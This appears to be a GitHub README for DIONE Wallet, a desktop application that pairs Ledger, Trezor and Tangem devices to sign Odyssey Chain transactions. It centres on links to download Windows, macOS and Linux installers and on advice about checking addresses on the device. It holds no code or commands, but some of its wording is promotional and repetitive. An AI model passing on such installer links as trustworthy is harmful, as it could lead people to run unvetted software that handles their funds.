<p align="center">
  <img src="assets/banner-profile.png" alt="DIONE Wallet: self-custody wallet for Odyssey Chain" width="100%">
</p>

<h1 align="center">DIONE Wallet</h1>

<p align="center">Hardware signing for Odyssey Chain, with the transaction approved on a screen you can hold.</p>

<p align="center"><a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9"><img src="https://img.shields.io/badge/RELEASE-v4.5.9-66519E?style=for-the-badge" alt="Release v4.5.9"></a></p>

## Downloads - v4.5.9

<p align="center"><a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-006971?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Windows"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-006971?style=for-the-badge&logo=apple&logoColor=white" alt="macOS"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-006971?style=for-the-badge&logo=linux&logoColor=white" alt="Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-66519E?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white&labelColor=1B1B1D" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`dione-wallet-v4.5.9.exe`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-66519E?style=flat-square&logo=apple&logoColor=white&labelColor=1B1B1D" alt="macOS"> | macOS 12 or later | [`dione-wallet-v4.5.9.dmg`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-66519E?style=flat-square&logo=linux&logoColor=white&labelColor=1B1B1D" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`dione-wallet-v4.5.9.zip`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip) |

</div>

Checksums for every file are on the [v4.5.9 release page](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9).

> [!WARNING]
> Only download from this GitHub release page. A mirror, a search advertisement or a file sent in a chat is not the project.

---

The device approves transactions for the chains it has an app for, and the one you need is not on that list. Holding DIONE on the device is the part that works; signing for Odyssey Chain from it needs a host application that knows how to build the transaction and hand it over for approval.

DIONE Wallet is that host. It pairs with a Ledger, composes the transaction, sends it to the device, and shows the address the device reports so the two can be compared before anything is signed. The private key stays where it was, which is the whole point of owning the device in the first place. The same application also pairs with Tangem over NFC and with a Trezor, so a team holding three kinds of hardware does not need three wallets.

## Why DIONE Wallet

The gap between a hardware device and a chain is always software, and the quality of that software is what decides whether the device is protecting anything.

- Signing happens on the device, with the address confirmed there rather than on the computer screen.
- Pairing lives in the wallet's own device settings, so a second device is a settings change rather than a reinstall.
- Staking and validator choice are available while the keys are still on the hardware, which is not true of every wallet.
- A signed application that verifies its own updates, so the host the device trusts is not the weak link.

One habit is worth stating plainly. The device shows an address, and the screen you compare it against has to be the device's own, not a label in the application. A wallet that is compromised can show you a friendly address while sending the device something else, and the only defence is reading the confirmation on the hardware.

This repository is the Ledger side of Odyssey Chain, and this page is one of the wallet's pages rather than a description of it.

## Guides

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Connect a Ledger to DIONE Wallet](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/connect-a-ledger-to-dione-wallet.md) | Unlocking the device, opening the right app, pairing from settings and confirming the address on its screen. |
| [Pair a Trezor With DIONE Wallet](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/pair-trezor-with-dione-wallet.md) | The second device route, with the same address check and a different menu. |
| [Use Tangem With DIONE Wallet](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/use-tangem-with-dione-wallet.md) | NFC pairing for the card that holds the keys without a cable. |
| [DIONE Wallet Security Audit, Explained](https://github.com/dione-protocol/keys-and-transfers/blob/main/dione-wallet-security-audit-explained.md) | What the audit found, and what a signature proves about a build. |

</div>

**The phrase is the wallet.** A hardware device makes the phrase harder to steal, not less final; the recovery words still belong on paper and nowhere else.

## What changes once the wallet is installed

The device stops being a place where DIONE sits unused. It becomes a signer for the chain: the application composes a transfer, a delegation or a reward claim, the hardware approves it, and the key never leaves the secure element. That is the arrangement the device was bought for, and it now covers Odyssey Chain rather than only the chains with a first-party app.

The practical difference shows up in the confirmation step. Instead of clicking a button and trusting a window, you read an address and an amount on a screen that malware on the computer cannot repaint. It is slower by a few seconds per transaction and worth every one of them.

- The private key stays on the device while the chain work happens in the app.
- Addresses are confirmed on the hardware rather than on the computer screen.
- Staking and validator choice remain available with the keys off the machine.

## Common first questions

### Do I need a separate app installed for Odyssey Chain?

No separate chain app is involved on the host side. The wallet is the host application, and it handles the transaction construction that the device signs.

### What if the address on the device differs from the one in the wallet?

Stop and do not approve. A different address means something between the two is lying, and the safe response is to disconnect, reinstall from the signed release and try again rather than to accept the mismatch.

### Can I use the wallet without the device?

Yes, the application also runs with keys encrypted on the machine. The device is an upgrade to how those keys are held, not a requirement for using the wallet at all.

## Support

Ask about pairing, a release or a signing failure in the [dione-desktop-wallet issue tracker](https://github.com/dione-protocol/dione-desktop-wallet/issues). For a vulnerability, use a private security advisory on that repository.

---

<p align="center"><a href="https://github.com/dione-protocol/dione-desktop-wallet">DIONE Wallet application</a> | <a href="https://github.com/dione-protocol/setup-and-troubleshooting">All guides</a> | <a href="https://github.com/dione-protocol">All repositories</a></p>
